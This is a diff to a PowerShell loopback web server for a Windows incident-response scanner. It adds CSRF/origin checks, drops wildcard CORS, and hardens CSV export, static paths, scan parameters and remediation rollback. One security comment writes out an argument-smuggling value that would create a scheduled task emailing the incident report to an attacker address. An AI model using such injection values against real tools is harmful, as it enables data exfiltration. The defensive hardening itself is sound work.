@@ -115,6 +115,9 @@ $script:State = [hashtable]::Synchronized(@{
     StartTime    = [datetime]::MinValue
     LineCount    = 0
     ResultsPath  = ''
+    SnapshotRequested = $true   # "Create Rollback Snapshot" (default on, mirrors the GUI checkbox):
+                                # the remediation runspace exports a .reg rollback before applying fixes
+    SnapshotPath = ''
     Listening    = $true
     EventLogFile = $script:EVENT_LOG   # durable tee of the SSE event stream (set above); read by Enqueue/REnqueue
     ScanEpoch    = 0      # bumped each time EventLog is cleared for a new scan; SSE clients rewind on change
@@ -145,17 +148,51 @@ $script:MIME = @{
     '.ttf'  = 'font/ttf'
 }
 
-# ── Classification patterns (used by main thread and embedded in SCAN_SCRIPT) ──
-$script:SEV_PATTERNS = [ordered]@{
-    CRITICAL = [regex]'\[CRIT\]|CRITICAL|\[!!\]|THREAT BANNER|IOC HIT|BLATANT'
-    HIGH     = [regex]'\[HIGH\]|HIGH SEVERITY|\[WARN\]|SUSPICIOUS'
-    POSSIBLE = [regex]'\[POSSIBLE\]|POSSIBLE|FLAGGED|ANOMAL'
-    CLEAN    = [regex]'\[OK\s*\]|CLEAN|NO .* FOUND|->\s*\[OK\s*\]'
-    INFO     = [regex]'\[INFO\]|\[VER\]|EXECUTED|EVALUATED'
-    HUNT     = [regex]'\[HUNT\]|SCANNING|CHECKING|AUDITING'
-}
+# NOTE (2026-07-22 review #45): $script:SEV_PATTERNS and $script:PHASE_RE used to live here and
+# were dead — a runspace cannot share script scope with its parent, so the scan runspace embeds
+# its OWN copies (see $script:SCAN_SCRIPT's $SEV_RX / phase regex, which are the live ones).
+# $PHASE_RE here was additionally a stale NON-fractional 'PHASE\s+(\d+)' that would have misled
+# an editor into "fixing" the runspace copy to match it and silently dropping phases 55.5/74.5/99.5.
+# Removed rather than kept as documentation. Edit the copies inside $script:SCAN_SCRIPT.
 
-$script:PHASE_RE = [regex]'PHASE\s+(\d+)[^\d]'
+# ── CSRF / origin hardening (2026-07-22 review #2) ─────────────────────────────
+# This server binds to loopback, but "loopback" is NOT "only the GUI can reach it": every
+# page in the operator's browser can reach it too. With the old `Access-Control-Allow-Origin: *`
+# plus a permissive OPTIONS preflight, any site the operator had open — a malicious ad, a
+# compromised vendor page — could POST /api/remediate and drive real destructive remediation
+# (file deletes, registry deletes, process kills) on the machine being audited, bypassing the
+# typed-PURGE modal that is the load-bearing safety gate for destructive actions.
+#
+# Two independent locks, both enforced on every state-changing (POST) route:
+#   1. Origin/Referer must be this server's own address. A browser ALWAYS sends Origin on a
+#      cross-origin POST, so a malicious page cannot omit it to slip past.
+#   2. A per-process random token must be echoed in X-ZB-Token. The token is only readable
+#      same-origin (GET /api/csrf, and no ACAO header is sent any more), so a cross-origin
+#      page cannot learn it even if it could reach the route.
+# A request carrying NEITHER Origin NOR Referer is treated as a non-browser client (curl,
+# Invoke-WebRequest, the headless test harness) and is allowed without a token — that path is
+# unreachable from a web page, which is what the locks exist to stop.
+$script:CSRF_TOKEN = [Convert]::ToBase64String([Guid]::NewGuid().ToByteArray() + [Guid]::NewGuid().ToByteArray()).TrimEnd('=')
+$script:ALLOWED_ORIGINS = @()   # populated once the port is known (see listener setup)
+
+function Test-RequestAllowed {
+    # Returns $null when the request may proceed, or a reason string to reject with 403.
+    param($Req)
+    $origin  = "$($Req.Headers['Origin'])"
+    $referer = "$($Req.Headers['Referer'])"
+    if (-not $origin -and -not $referer) { return $null }   # non-browser client
+    if ($origin) {
+        if ($script:ALLOWED_ORIGINS -notcontains $origin.TrimEnd('/')) { return "cross-origin request rejected (Origin: $origin)" }
+    } elseif ($referer) {
+        $refOk = $false
+        foreach ($ao in $script:ALLOWED_ORIGINS) { if ($referer.StartsWith("$ao/") -or $referer -eq $ao) { $refOk = $true; break } }
+        if (-not $refOk) { return "cross-origin request rejected (Referer: $referer)" }
+    }
+    # Same-origin browser request: the token must match too.
+    $tok = "$($Req.Headers['X-ZB-Token'])"
+    if ($tok -ne $script:CSRF_TOKEN) { return 'missing or invalid CSRF token' }
+    return $null
+}
 
 # ── Helpers ────────────────────────────────────────────────────────────────────
 function Get-FreePort {
@@ -172,8 +209,9 @@ function Write-JsonResponse {
         $r = $Ctx.Response
         $r.StatusCode    = $Code
         $r.ContentType   = 'application/json; charset=utf-8'
-        $r.Headers['Access-Control-Allow-Origin']  = '*'
-        $r.Headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
+        # No Access-Control-Allow-Origin: the GUI is served from this same origin and needs
+        # none, while sending '*' let any other page in the operator's browser read these
+        # responses (and, with the old permissive preflight, drive /api/remediate).
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
         $r.ContentLength64 = $bytes.Length
         $r.OutputStream.Write($bytes, 0, $bytes.Length)
@@ -194,7 +232,6 @@ function Send-StaticFile {
         $r = $Ctx.Response
         $r.StatusCode  = 200
         $r.ContentType = $mime
-        $r.Headers['Access-Control-Allow-Origin'] = '*'
         $bytes = [System.IO.File]::ReadAllBytes($FilePath)
         $r.ContentLength64 = $bytes.Length
         $r.OutputStream.Write($bytes, 0, $bytes.Length)
@@ -208,7 +245,6 @@ function Write-DownloadResponse {
         $r = $Ctx.Response
         $r.StatusCode  = 200
         $r.ContentType = $ContentType
-        $r.Headers['Access-Control-Allow-Origin'] = '*'
         $r.Headers['Content-Disposition'] = "attachment; filename=`"$FileName`""
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
         $r.ContentLength64 = $bytes.Length
@@ -280,7 +316,15 @@ function Get-CsvReport {
         $mid = if ($f.mitre -and $f.mitre.id) { "$($f.mitre.id)" } else { '' }
         $mnm = if ($f.mitre -and $f.mitre.name) { "$($f.mitre.name)" } else { '' }
         $cells = @("$($f.severity)", "PH$($f.phase)", "$($f.threat_type)", $mid, $mnm, "$($f.line)", "$($f.timestamp)")
-        $line = ($cells | ForEach-Object { '"' + ($_ -replace '"','""') + '"' }) -join ','
+        # Neutralise CSV/formula injection. A finding's Detail carries attacker-chosen text
+        # (filenames, registry values, command lines); a cell starting =, +, - or @ is executed
+        # as a formula/DDE payload when the technician opens the export in Excel. Prefixing a
+        # single quote is the standard defence and Excel hides it in the cell.
+        $line = ($cells | ForEach-Object {
+            $c = "$_"
+            if ($c -match '^[=+\-@\t\r]') { $c = "'" + $c }
+            '"' + ($c -replace '"','""') + '"'
+        }) -join ','
         [void]$sb.AppendLine($line)
     }
     return $sb.ToString()
@@ -474,6 +518,7 @@ function Get-SysInfoJson {
             cpu       = [math]::Round([double]($cpu), 1)
             ram_used  = $ramPct
             defender  = [bool]$defender
+            reports_dir = $script:REPORTS   # Settings shows the real output path (review #32)
         } | ConvertTo-Json -Compress
     } catch {
         return '{"error":"sysinfo unavailable"}'
@@ -481,8 +526,30 @@ function Get-SysInfoJson {
 }
 
 # ── Background runspace launcher ────────────────────────────────────────────────
+# Every call site discards the handle, and nothing ever disposed the PowerShell/Runspace pair,
+# so a long IR session (each SSE reconnect spawns one, each scan another) steadily leaked
+# threads and handles. Track the live ones and reap the finished ones on each launch — an
+# async completion callback would be tidier but cannot run in a runspace we are about to
+# dispose, and this server never has more than a handful in flight.
+$script:LiveRunspaces = [System.Collections.ArrayList]::new()
+
+function Clear-FinishedRunspaces {
+    for ($i = $script:LiveRunspaces.Count - 1; $i -ge 0; $i--) {
+        $e = $script:LiveRunspaces[$i]
+        try {
+            if ($e.Handle.IsCompleted) {
+                try { [void]$e.Ps.EndInvoke($e.Handle) } catch {}
+                try { $e.Ps.Dispose() } catch {}
+                try { $e.Rs.Close(); $e.Rs.Dispose() } catch {}
+                $script:LiveRunspaces.RemoveAt($i)
+            }
+        } catch { $script:LiveRunspaces.RemoveAt($i) }
+    }
+}
+
 function Start-Runspace {
     param([string]$Script, [hashtable]$Vars = @{})
+    Clear-FinishedRunspaces
     $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
     $rs.Open()
     foreach ($k in $Vars.Keys) {
@@ -491,7 +558,8 @@ function Start-Runspace {
     $ps = [System.Management.Automation.PowerShell]::Create()
     $ps.Runspace = $rs
     [void]$ps.AddScript($Script)
-    $null = $ps.BeginInvoke()
+    $handle = $ps.BeginInvoke()
+    [void]$script:LiveRunspaces.Add([pscustomobject]@{ Ps = $ps; Rs = $rs; Handle = $handle })
     return $ps
 }
 
@@ -503,7 +571,8 @@ $response.StatusCode = 200
 $response.ContentType = 'text/event-stream; charset=utf-8'
 $response.Headers['Cache-Control']       = 'no-cache, no-store'
 $response.Headers['X-Accel-Buffering']   = 'no'
-$response.Headers['Access-Control-Allow-Origin'] = '*'
+# No ACAO: the event stream carries live finding data, and '*' let any other page in the
+# operator's browser subscribe to it cross-origin. The GUI is same-origin and needs none.
 $response.Headers['Connection']          = 'keep-alive'
 $response.SendChunked = $true
 
@@ -670,18 +739,43 @@ function Resolve-Mitre {
     return @{ id = $id; name = $t.name; tactic = $tactic; url = $t.url }
 }
 
+# Runspace-local copy of the main thread's ConvertTo-Flag — a runspace cannot see the parent's
+# functions, so this must be defined here. Keep in sync with the main-thread definition.
+function ConvertTo-Flag {
+    param($v)
+    if ($v -is [bool]) { return $v }
+    return ("$v" -match '^(?i)(true|1|yes)$')
+}
+
 # ── Extract config ──────────────────────────────────────────────────────────────
 # SECURITY (C1): $mode is interpolated UNQUOTED into the child argument string below, so it
 # MUST be constrained to the exact engine mode enum. Without this, a caller (e.g. a CSRF POST
-# from any page the operator visits — the listener has wildcard CORS) could smuggle extra engine
-# parameters like "-Schedule DAILY -SmtpTo attacker@evil" → a SYSTEM scheduled task that emails
-# the incident report out. Anything not on the allowlist falls back to FULL.
+# from any page the operator visits) could smuggle extra engine parameters like
+# "-Schedule DAILY -SmtpTo attacker@evil" → a SYSTEM scheduled task that emails the incident
+# report out. Anything not on the allowlist falls back to FULL. (The cross-origin route into
+# here is now closed too — see Test-RequestAllowed — but this stays as defence in depth.)
 $mode     = if ($ScanConfig.mode) { ("$($ScanConfig.mode)").Trim().ToUpper() } else { 'FULL' }
 if ($mode -notin @('QUICK','FULL','DEEP','PARANOID','STEALTH')) { $mode = 'FULL' }
-$hours    = if ($null -ne $ScanConfig.hours) { [int]$ScanConfig.hours } else { 0 }
-$doHtml   = [bool]$ScanConfig.html_report
-$paranoid = [bool]$ScanConfig.paranoid
-$stealth  = [bool]$ScanConfig.stealth
+# $hours is interpolated unquoted into the same argument string, and a raw [int] cast on a
+# non-numeric value throws — before $ScanState.Running was ever set, so the scan died with the
+# GUI still showing "starting" and no error anywhere. Parse defensively and fall back to 0
+# (all time), matching the fail-closed treatment $mode already gets. Bounded like the profile
+# route's identical check so a silly value cannot build a nonsense -Hours argument.
+$hours = 0
+if ($null -ne $ScanConfig.hours) {
+    if (-not [int]::TryParse("$($ScanConfig.hours)", [ref]$hours) -or $hours -lt 0 -or $hours -gt 8760) { $hours = 0 }
+}
+# ConvertTo-Flag, not [bool]: [bool]'false' is $true in PowerShell (any non-empty string is
+# truthy), so a client sending JSON string booleans silently enabled stealth/paranoid. The
+# profile-save route already used the helper; this path was the one that still did not.
+$doHtml   = ConvertTo-Flag $ScanConfig.html_report
+$paranoid = ConvertTo-Flag $ScanConfig.paranoid
+$stealth  = ConvertTo-Flag $ScanConfig.stealth
+# The three toggles that used to be inert (review #14): the GUI now sends them and each
+# has a real effect here.
+$doSnapshot = ConvertTo-Flag $ScanConfig.snapshot
+$doBaseline = ConvertTo-Flag $ScanConfig.baseline
+$doCsv      = ConvertTo-Flag $ScanConfig.csv
 $iocFile  = "$($ScanConfig.ioc_file)"
 
 # ── Reset state for new scan ────────────────────────────────────────────────────
@@ -709,6 +803,23 @@ if ($doHtml)   { $psArgs += ' -Html' }
 if ($paranoid) { $psArgs += ' -Paranoid' }
 if ($stealth)  { $psArgs += ' -Stealth' }
 if ($iocFile -and (Test-Path $iocFile)) { $psArgs += " -IocFile `"$iocFile`"" }
+# "Baseline Diff Mode": hand the engine the most recent prior baseline so it can report what
+# is NEW since then. Silently skipped on a first-ever run (no baseline exists yet) — and the
+# file the CURRENT run is about to overwrite is captured before it is replaced.
+if ($doBaseline) {
+    $prevBase = Get-ChildItem -Path $ScanReports -Filter 'KrakenBaseline_*.json' -File -ErrorAction SilentlyContinue |
+                Sort-Object LastWriteTime -Descending | Select-Object -First 1
+    if ($prevBase) {
+        $psArgs += " -Baseline `"$($prevBase.FullName)`""
+        Enqueue @{ type='log_line'; text="[INFO] Baseline diff enabled — comparing against $($prevBase.Name)"; severity='INFO'; phase=0; elapsed=0 }
+    } else {
+        Enqueue @{ type='log_line'; text='[INFO] Baseline diff requested but no prior baseline exists yet — this run becomes the baseline.'; severity='INFO'; phase=0; elapsed=0 }
+    }
+}
+# "Create Rollback Snapshot": the engine only builds one inside its interactive fix mode, which
+# an -Auto (GUI) run never reaches — so GUI-driven remediation had no rollback at all. Record
+# the request; the remediation runspace exports the registry snapshot before it applies fixes.
+$ScanState.SnapshotRequested = $doSnapshot
 
 $psi = [System.Diagnostics.ProcessStartInfo]::new()
 $psi.FileName               = 'powershell.exe'
@@ -804,7 +915,14 @@ try {
             # integer phase and looking like a stall.
             $pv = $pm.Groups[1].Value
             $newPhase = if ($pv.Contains('.')) { [double]$pv } else { [int]$pv }
-            if ($newPhase -ne $ScanState.Phase) {
+            # MONOTONIC: the counter may only move FORWARD within a scan. The engine runs
+            # phases in strict numeric order, but Summary.ps1's end-of-run "10 SLOWEST"
+            # table prints lines like "PHASE 107 - EVENT LOG THREAT HUNTING" in DESCENDING
+            # duration order — each one matched this regex and dragged the counter backwards,
+            # so a finished DEEP scan reported e.g. 89/115 instead of 115/115 (observed
+            # 2026-07-22). Ignoring lower numbers also immunises the counter against any
+            # other trailing text that happens to mention a phase.
+            if ($newPhase -gt $ScanState.Phase) {
                 $ScanState.Phase = $newPhase
                 # Progress index: count of distinct phase headers this scan. QUICK's
                 # phase set is non-contiguous, so this (not the raw number) drives its
@@ -963,6 +1081,32 @@ try {
         $ScanState.ResultsPath = $rp
     } catch {}
 
+    # "Export CSV" toggle (review #14): drop a CSV alongside the JSON report so the operator
+    # gets the deliverable without a second trip through /api/export/csv. Same column set and
+    # the same formula-injection neutralisation as that route.
+    if ($doCsv) {
+        try {
+            $csvPath = Join-Path $ScanReports "audit_$ts.csv"
+            $sbCsv = [System.Text.StringBuilder]::new()
+            [void]$sbCsv.AppendLine('"Severity","Phase","ThreatType","ATTACK_ID","ATTACK_Name","Detail","Timestamp"')
+            foreach ($fx in @($ScanState.Findings)) {
+                $cid = if ($fx.mitre -and $fx.mitre.id)   { "$($fx.mitre.id)" }   else { '' }
+                $cnm = if ($fx.mitre -and $fx.mitre.name) { "$($fx.mitre.name)" } else { '' }
+                $cl = (@("$($fx.severity)", "PH$($fx.phase)", "$($fx.threat_type)", $cid, $cnm, "$($fx.line)", "$($fx.timestamp)") |
+                    ForEach-Object {
+                        $c = "$_"
+                        if ($c -match '^[=+\-@\t\r]') { $c = "'" + $c }   # Excel formula/DDE injection
+                        '"' + ($c -replace '"','""') + '"'
+                    }) -join ','
+                [void]$sbCsv.AppendLine($cl)
+            }
+            [System.IO.File]::WriteAllText($csvPath, $sbCsv.ToString(), (New-Object System.Text.UTF8Encoding($false)))
+            Enqueue @{ type='log_line'; text="[INFO] CSV export written: $csvPath"; severity='INFO'; phase=0; elapsed=$ScanState.Elapsed }
+        } catch {
+            Enqueue @{ type='log_line'; text="[WARN] CSV export failed: $($_.Exception.Message)"; severity='POSSIBLE'; phase=0; elapsed=$ScanState.Elapsed }
+        }
+    }
+
     # Locate the engine's *rich* report (KrakenBaseline_*.json holds FixAction/FixParam
     # per finding) written by this run — used by GUI remediation.
     $engineReport = ''
@@ -1018,6 +1162,16 @@ function REnqueue {
 }
 function RLog { param([string]$Text, [string]$Sev = 'INFO') REnqueue @{ type='log_line'; text=$Text; severity=$Sev; phase=0; elapsed=0 } }
 
+# Safe registry read — the runspace copy of the engine's Get-RegVal (a runspace cannot see the
+# loader's helpers). Get-ItemPropertyValue throws a TERMINATING error when the value does not
+# exist, which -ErrorAction SilentlyContinue does NOT suppress; called raw it aborted the whole
+# reboot-queue fallback on any box that had never queued a pending rename before — i.e. the
+# common case, on the code path that handles a locked malware file.
+function RGet-RegVal {
+    param([string]$Path, [string]$Name)
+    try { Get-ItemPropertyValue -Path $Path -Name $Name -ErrorAction Stop } catch { $null }
+}
+
 # SAFETY: hard backstop — mirror of Test-ProtectedTarget (main thread). The tool must NEVER
 # damage the system, so even a manually-selected finding is refused if it touches a protected
 # resource. Keep in sync with the main-thread copy in Get-EngineReportFindings's vicinity.
@@ -1043,6 +1197,49 @@ try {
     $sel = @($report.Findings) | Where-Object { $idset.ContainsKey("$($_.ID)") }
     RLog ("[REMEDIATE] {0} action(s) selected from {1}." -f $sel.Count, [System.IO.Path]::GetFileName($ReportPath)) 'INFO'
 
+    # ── Rollback snapshot ──────────────────────────────────────────────────────
+    # The console fix mode has always taken one before touching anything; GUI-driven
+    # remediation took none at all, so a mistaken PURGE had nothing to restore from.
+    # Honours the launchpad's "Create Rollback Snapshot" checkbox. Registry only —
+    # deleted FILES are recoverable via the quarantine vault instead, which is why
+    # Quarantine is preferred over DeleteFile for anything not hash-confirmed.
+    if ($RemState.SnapshotRequested -and @($sel).Count -gt 0) {
+        try {
+            $snapStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
+            $snapPath  = Join-Path $RemReports "rollback_$snapStamp.reg"
+            $snapKeys  = @(
+                @{ H='HKCU'; K='SOFTWARE\Microsoft\Windows\CurrentVersion\Run' },
+                @{ H='HKLM'; K='SOFTWARE\Microsoft\Windows\CurrentVersion\Run' },
+                @{ H='HKLM'; K='SYSTEM\CurrentControlSet\Services' },
+                @{ H='HKLM'; K='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' },
+                @{ H='HKCU'; K='SOFTWARE\Classes\CLSID' }
+            )
+            # A .reg file MUST open with the version magic or `regedit /S` imports nothing.
+            # Keep only the first copy of that header and comment the provenance banner with ';'.
+            $snapOut = New-Object System.Collections.Generic.List[string]
+            $snapOut.Add('Windows Registry Editor Version 5.00')
+            $snapOut.Add('')
+            $snapOut.Add("; ZEROBREACH GUI REMEDIATION ROLLBACK | $(Get-Date) | $env:COMPUTERNAME")
+            $snapOut.Add('; ' + ('=' * 78))
+            $snapOut.Add('')
+            foreach ($sk in $snapKeys) {
+                $tmp = Join-Path $env:TEMP ("zb_snap_{0}_{1}.reg" -f $sk.H, ($sk.K -replace '[^A-Za-z0-9]',''))
+                reg export "$($sk.H)\$($sk.K)" $tmp /y 2>$null | Out-Null
+                if (Test-Path -LiteralPath $tmp) {
+                    $raw = Get-Content -LiteralPath $tmp -Raw -ErrorAction SilentlyContinue
+                    if ($raw) { $snapOut.Add(($raw -replace '^\s*Windows Registry Editor Version 5\.00\s*', '')) }
+                    Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
+                }
+            }
+            [System.IO.File]::WriteAllLines($snapPath, $snapOut, [System.Text.UnicodeEncoding]::new($false, $true))
+            $RemState.SnapshotPath = $snapPath
+            RLog "[REMEDIATE] Rollback snapshot saved: $snapPath" 'OK'
+            RLog "[REMEDIATE]   -> restore with: regedit /S `"$snapPath`"" 'INFO'
+        } catch {
+            RLog "[REMEDIATE] Rollback snapshot FAILED ($($_.Exception.Message)) — continuing without rollback." 'POSSIBLE'
+        }
+    }
+
     foreach ($f in $sel) {
         $desc = "$($f.Description)"; if ($desc.Length -gt 70) { $desc = $desc.Substring(0,67) + '...' }
 
@@ -1063,7 +1260,7 @@ try {
                         Remove-Item -LiteralPath $f.FixParam -Recurse -Force -ErrorAction Stop
                         if (Test-Path -LiteralPath $f.FixParam) {
                             $rpk = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
-                            $cur = Get-ItemPropertyValue $rpk "PendingFileRenameOperations" -ErrorAction SilentlyContinue
+                            $cur = RGet-RegVal $rpk "PendingFileRenameOperations"   # raw Get-ItemPropertyValue throws when absent
                             if ($null -eq $cur) { $cur = @() }
                             Set-ItemProperty $rpk "PendingFileRenameOperations" ([string[]]($cur) + @("\??\$($f.FixParam)", "")) -Type MultiString -Force -ErrorAction SilentlyContinue
                             RLog "  -> locked; queued for reboot deletion." 'POSSIBLE'
@@ -1075,7 +1272,15 @@ try {
                     $pts = "$($f.FixParam)" -split "\|", 2
                     if ($pts.Count -eq 2) {
                         Remove-ItemProperty -Path $pts[0] -Name $pts[1] -Force -ErrorAction SilentlyContinue
-                        RLog "  -> reg value removed: $($pts[1])" 'OK'; $ok = $true
+                        # Verify the post-condition like every sibling action does. Removal is
+                        # -EA SilentlyContinue, so an ACL-protected or in-use value fails silently;
+                        # reporting `applied` unconditionally told the operator a persistence value
+                        # was gone when it was still armed — the worst possible lie for this tool.
+                        if ($null -eq (RGet-RegVal $pts[0] $pts[1])) {
+                            RLog "  -> reg value removed: $($pts[1])" 'OK'; $ok = $true
+                        } else {
+                            RLog "  -> reg value REMOVE FAILED (still present): $($pts[1])" 'POSSIBLE'; $failed++
+                        }
                     } else { RLog "  -> malformed reg target." 'POSSIBLE'; $failed++ }
                 }
                 'DeleteRegKey' {
@@ -1116,7 +1321,7 @@ try {
                         catch {
                             try { Copy-Item -LiteralPath $src -Destination $dest -Force -ErrorAction Stop } catch {}
                             $rpk = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
-                            $cur = Get-ItemPropertyValue $rpk "PendingFileRenameOperations" -ErrorAction SilentlyContinue
+                            $cur = RGet-RegVal $rpk "PendingFileRenameOperations"   # raw Get-ItemPropertyValue throws when absent
                             if ($null -eq $cur) { $cur = @() }
                             Set-ItemProperty $rpk "PendingFileRenameOperations" ([string[]]($cur) + @("\??\$src", "")) -Type MultiString -Force -ErrorAction SilentlyContinue
                         }
@@ -1157,26 +1362,63 @@ function Handle-Request {
     $path   = $req.Url.AbsolutePath
     $method = $req.HttpMethod
 
-    # CORS preflight
+    # CORS preflight — answered ONLY for this server's own origin. Previously this replied
+    # `Allow-Origin: *` + `Allow-Methods: GET, POST`, which is precisely what let a foreign
+    # page's JSON POST to /api/remediate pass preflight and execute.
     if ($method -eq 'OPTIONS') {
-        $Ctx.Response.StatusCode = 204
-        $Ctx.Response.Headers['Access-Control-Allow-Origin']  = '*'
-        $Ctx.Response.Headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
-        $Ctx.Response.Headers['Access-Control-Allow-Headers'] = 'Content-Type'
+        $pfOrigin = "$($req.Headers['Origin'])".TrimEnd('/')
+        if ($pfOrigin -and $script:ALLOWED_ORIGINS -contains $pfOrigin) {
+            $Ctx.Response.StatusCode = 204
+            $Ctx.Response.Headers['Access-Control-Allow-Origin']  = $pfOrigin
+            $Ctx.Response.Headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
+            $Ctx.Response.Headers['Access-Control-Allow-Headers'] = 'Content-Type, X-ZB-Token'
+            $Ctx.Response.Headers['Vary'] = 'Origin'
+        } else {
+            $Ctx.Response.StatusCode = 403
+        }
         try { $Ctx.Response.Close() } catch {}
         return
     }
 
+    # Hard gate on every state-changing request, ahead of the route table so a new POST
+    # route can never be added without it.
+    if ($method -eq 'POST') {
+        $denyReason = Test-RequestAllowed $req
+        if ($denyReason) {
+            # Start-Transcript tees the console to server_console_*.log, so this is durable.
+            Write-Host "[ZeroBreach] BLOCKED POST $path — $denyReason" -ForegroundColor Yellow
+            Write-JsonResponse $Ctx (@{ error = 'forbidden'; detail = $denyReason } | ConvertTo-Json -Compress) 403
+            return
+        }
+    }
+
     switch -Regex ($path) {
+
+        # Same-origin-only handshake: the GUI reads its CSRF token here at boot. With no
+        # Access-Control-Allow-Origin on the response, a cross-origin page cannot read it.
+        '^/api/csrf$' {
+            Write-JsonResponse $Ctx (@{ token = $script:CSRF_TOKEN } | ConvertTo-Json -Compress)
+        }
+
 
         '^/$' {
             Send-StaticFile $Ctx (Join-Path $script:GUI_DIR 'templates\index.html')
         }
 
         '^/static/' {
+            # Containment check, like every other file-touching route here. AbsolutePath is
+            # URL-decoded by HttpListener, so a request could carry ..\ segments; resolve the
+            # candidate and confirm it really sits under gui\static before reading it.
             $rel = $path -replace '^/static/', ''
             $rel = $rel -replace '/', '\'
-            Send-StaticFile $Ctx (Join-Path $script:GUI_DIR "static\$rel")
+            $staticRoot = [IO.Path]::GetFullPath((Join-Path $script:GUI_DIR 'static'))
+            $full = $null
+            try { $full = [IO.Path]::GetFullPath((Join-Path $staticRoot $rel)) } catch { $full = $null }
+            if (-not $full -or -not $full.StartsWith($staticRoot.TrimEnd('\') + '\', [StringComparison]::OrdinalIgnoreCase)) {
+                Write-JsonResponse $Ctx '{"error":"not found"}' 404
+                return
+            }
+            Send-StaticFile $Ctx $full
         }
 
         '^/api/sysinfo$' {
@@ -1413,6 +1655,65 @@ function Handle-Request {
             Write-JsonResponse $Ctx '{"status":"started"}'
         }
 
+        # Scheduled recurring scan + SMTP delivery (review #32). The Settings view rendered
+        # these controls with no listeners and no route behind them — the whole SCHEDULE/SMTP
+        # section did nothing. The engine registers the task itself and exits before scanning
+        # (-Schedule DAILY|WEEKLY), so this spawns it and reports the child's exit code.
+        '^/api/schedule$' {
+            if ($method -ne 'POST') {
+                # GET returns the last-applied settings so the fields repopulate on reload.
+                $schedFile = Join-Path $script:REPORTS 'schedule_settings.json'
+                if (Test-Path -LiteralPath $schedFile) {
+                    try {
+                        Write-JsonResponse $Ctx (Get-Content -LiteralPath $schedFile -Raw -ErrorAction Stop)
+                        return
+                    } catch {}
+                }
+                Write-JsonResponse $Ctx '{"schedule":"","smtp_server":"","smtp_from":"","smtp_to":""}'
+                return
+            }
+            $sb = Read-JsonBody $Ctx
+            if ($null -eq $sb) { Write-JsonResponse $Ctx '{"error":"invalid JSON"}' 400; return }
+            $sched = "$($sb.schedule)".Trim().ToUpper()
+            if ($sched -notin @('','DAILY','WEEKLY')) { Write-JsonResponse $Ctx '{"error":"schedule must be DAILY, WEEKLY or empty"}' 400; return }
+            $smtpSrv = "$($sb.smtp_server)".Trim()
+            $smtpFrm = "$($sb.smtp_from)".Trim()
+            $smtpTo  = "$($sb.smtp_to)".Trim()
+            # Persist regardless, so the operator's SMTP details survive a reload.
+            try {
+                Write-Utf8Json (Join-Path $script:REPORTS 'schedule_settings.json') ([ordered]@{
+                    schedule = $sched; smtp_server = $smtpSrv; smtp_from = $smtpFrm; smtp_to = $smtpTo
+                } | ConvertTo-Json)
+            } catch {}
+
+            if (-not $sched) {
+                # Disabled: remove any task we previously registered.
+                try { Unregister-ScheduledTask -TaskName 'ZeroBreach_V22_Scheduled' -Confirm:$false -ErrorAction Stop | Out-Null
+                      Write-JsonResponse $Ctx '{"status":"schedule removed"}' }
+                catch { Write-JsonResponse $Ctx '{"status":"no schedule was registered"}' }
+                return
+            }
+            # Values are passed as separate, individually quoted arguments — never concatenated
+            # into one interpolated command string — so an address cannot smuggle extra params.
+            $schedArgs = @(
+                '-NoProfile','-ExecutionPolicy','Bypass','-File', $script:SCAN_PS,
+                '-Schedule', $sched, '-Auto', '-OutDir', $script:REPORTS
+            )
+            if ($smtpTo -and $smtpFrm -and $smtpSrv) {
+                $schedArgs += @('-SmtpTo', $smtpTo, '-SmtpFrom', $smtpFrm, '-SmtpServer', $smtpSrv)
+            }
+            try {
+                $sp = Start-Process -FilePath 'powershell.exe' -ArgumentList $schedArgs -Wait -PassThru -WindowStyle Hidden -ErrorAction Stop
+                if ($sp.ExitCode -eq 0) {
+                    Write-JsonResponse $Ctx (@{ status = "scheduled task registered ($sched 02:00)" } | ConvertTo-Json -Compress)
+                } else {
+                    Write-JsonResponse $Ctx (@{ error = "engine exited with code $($sp.ExitCode)" } | ConvertTo-Json -Compress) 500
+                }
+            } catch {
+                Write-JsonResponse $Ctx (@{ error = "$($_.Exception.Message)" } | ConvertTo-Json -Compress) 500
+            }
+        }
+
         '^/api/scan/abort$' {
             $script:State.Running = $false
             $p = $script:State.Process
@@ -1441,6 +1742,15 @@ function Handle-Request {
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 if ($Port -eq 0) { $Port = Get-FreePort }
+
+# The origin allowlist for Test-RequestAllowed. The listener binds "localhost", which resolves
+# to both loopback families, so accept every spelling the browser may send for THIS port —
+# and nothing else.
+$script:ALLOWED_ORIGINS = @(
+    "http://localhost:$Port",
+    "http://127.0.0.1:$Port",
+    "http://[::1]:$Port"
+)
 
 $Listener = [System.Net.HttpListener]::new()
 $Listener.Prefixes.Add("http://localhost:$Port/")
